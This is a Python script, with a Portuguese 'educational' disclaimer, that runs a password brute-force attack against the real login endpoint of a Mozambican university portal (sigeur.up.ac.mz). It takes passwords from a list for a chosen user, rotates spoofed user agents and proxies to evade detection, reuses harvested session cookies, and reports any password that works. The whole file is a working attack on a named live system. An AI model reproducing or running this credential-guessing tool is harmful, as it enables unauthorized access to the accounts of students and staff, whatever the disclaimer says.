# : Author Oscar Namicano
# : LEIA O DESCLAIMER A SEGUIR ANTES DE USAR ESSE SCRIPT

"""
DISCLAIMER - USO EDUCACIONAL E ÉTICO

Este script foi desenvolvido exclusivamente para fins educacionais. 
Ele tem como objetivo demonstrar, de forma teórica e controlada, como funcionam ataques de força bruta e como sistemas web podem ser testados quanto à robustez de suas autenticações.

Domínio de estudo: https://sigeur.up.ac.mz/index.php
Este domínio foi escolhido como exemplo acadêmico por se tratar de um site universitário, onde o estudo e o aprimoramento da segurança digital são de interesse coletivo.

 ATENÇÃO:
- Este script NÃO DEVE ser utilizado contra sistemas para os quais você não possui autorização explícita.
- Qualquer uso indevido, sem permissão, contra sistemas reais, pode configurar crime, conforme leis locais e internacionais de cibersegurança.
- O autor deste código NÃO se responsabiliza por usos não autorizados ou mal-intencionados desta ferramenta.

Recomenda-se o uso deste código em ambientes de laboratório controlado, com contas de teste e dentro do escopo permitido pelas diretrizes institucionais da Universidade Pedagógica de Moçambique (UP).

Por favor, seja ético. A educação deve sempre caminhar junto com a responsabilidade.
Se poder reportar esta falha de seguranca aos administradores, sera melhor.

Autor: [Oscar Namicano]
Data: [22/04/2025]
"""

import requests
import time
import random



url = "https://sigeur.up.ac.mz/edondzo/controller/login.php"
# A url acima ee onde os dados do formulario sao enviados atraves do metodo post
# Essa a url pode ser encontrada inspecionando a pagina de login https://sigeur.up.ac.mz/index.php
# e enviar quaisquer dado no formulario controlando sempre os dados enviados e recebidos na aba 'Rede' do devtools

user_agents = []
proxies = []
with open('user-agents.txt', 'rt', encoding='utf-8') as ua:
    user_agents = ua.read().splitlines()

with open('proxies.txt', 'rt') as prxs:
        proxies = prxs.read().splitlines()


class Colors():
    azul = '\033[94m'
    ciano = '\033[96m'
    verde = '\033[92m'
    aviso = '\033[93m'
    falha = '\033[91m'
    reset = '\033[0m'
    negrito = '\033[1m'

def headers_generator():
    '''
    RETURN: headers

    INFO: O site do sigeur nao exige la tanto esses headers, pelo que os testes mostram-nos
          Porem estamos colocando apenas para enganar o servidor para que ele veja como se fosse um navegador normal 
          alem de um bot (requests).

          A parte dinamica desse headers e a User-Agent, que troca informacoes do browser ha cada duas requisicoes
          um user-agent valido encontrado durante testes foi:
          'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36 Edg/135.0.0.0'
    '''
    global user_agents

    
        
    user_agent = random.choice(user_agents)

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'DNT': '1',
        'Origin': 'https://sigeur.up.ac.mz',
        'Referer': 'https://sigeur.up.ac.mz/sigeup/index.php',
        'User-Agent': user_agent,
        'X-Requested-With': 'XMLHttpRequest'
    }
    return headers

def cookies_gathering(use_proxies=True):
    '''
    RETURN: Cookies

    INFO: This function makes a request from the https://sigeur.up.ac.mz/sigeup/index.php
          colects all cookies
          
          The cookie with the name 'PHPSESSID' is generated when we acess login page via requests
          so we can auto added it in our code

    '''
    global proxies

    cookies = {
        'PHPSESSID': 'vnmmq8th2tr5upattm9hjkp10m',
        '_ga': 'GA1.3.968128072.1745267818',
        '_gid': 'GA1.3.318559504.1745267818',
        '_gat_LoginPage': '1'
    }

    if use_proxies:
        random_proxy = random.choice(proxies)
        monted_proxy = {'http': random_proxy}
    else:
        monted_proxy = None
    r = requests.get(url, headers=headers_generator(), proxies=monted_proxy)

    for cookie in r.cookies:
        if 'PHPSESSID' == cookie.name:
            cookies['PHPSESSID'] = cookie.value
            continue
        
        cookies[cookie.name] = cookie.value

    return cookies

def try_login(usuario, senha, cookies, headers, use_proxy=True):
    global url, proxies


    data = {'usuario': usuario, 'senha': senha} # Estes sao os dads a serem enviados a pagina
     
    if use_proxy:
        proxy = {'http': random.choice(proxies)}
    else:
        proxy = None

    response = requests.post(url, data=data,headers=headers, proxies=proxy, cookies=cookies)
    
    try:
        json_response = response.json()
        if 'erro' in json_response:
            return False, json_response
        
        return True, json_response

    except:
        return False, 'Resposta do servidor invalida'
    
def main():
    usuario = input('Digite o numero de usuario > ')
    cores = Colors()

    with open('senhas.txt', 'rt') as pssw:
        senhas = pssw.read().splitlines()
        for i, senha in enumerate(senhas):
            if i % 2 == 0:
                headers = headers_generator()
                cookies = cookies_gathering()

            
            print(f'{cores.aviso}[#][#] Tentativa {i+1}: Testando a senha: {senha} para o usuario: {usuario} [#][#]{cores.reset}')
            flag, msg = try_login(usuario=usuario, senha=senha, cookies=cookies, headers=headers)

            if flag:
                # Success

                print(f'\n{cores.azul}[#][#] {msg} [#][#]{cores.reset}')
                print(f"{cores.verde}{cores.negrito}[#][#] SENHA: '{senha}' | USUARIO: '{usuario}' [#][#]{cores.reset}\n")
                break

if __name__ == '__main__':
    main()

        
        

